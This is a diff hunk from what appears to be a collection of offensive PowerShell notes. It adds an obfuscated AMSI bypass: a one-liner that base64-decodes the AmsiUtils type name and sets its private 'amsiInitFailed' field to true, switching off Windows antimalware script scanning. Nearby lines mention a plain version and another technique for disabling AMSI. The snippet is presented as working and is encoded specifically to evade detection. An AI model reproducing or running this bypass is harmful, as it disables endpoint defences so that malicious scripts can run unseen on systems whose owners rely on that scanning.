@@ -12,6 +12,13 @@ $GT = [Ref].Assembly.GetType($loc).GetField($field,'NonPublic,Static')
 $GT.SetValue($null,$true)
 
 ```
+
+**Obfuscated WORKING AMSI bypass.  Same as above just obfuscated for ps1 script**
+
+```powershell
+$amut = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzAA=="));$field = 'amsiInitFailed'; $GT = [Ref].Assembly.GetType($amut).GetField($field,'NonPublic,Static');$GT.SetValue("",$true)
+```
+<br>
 <br>
 
 ### Disable AMSI by attacking AmsiContext and rewrite first 4 bytes to 0000  
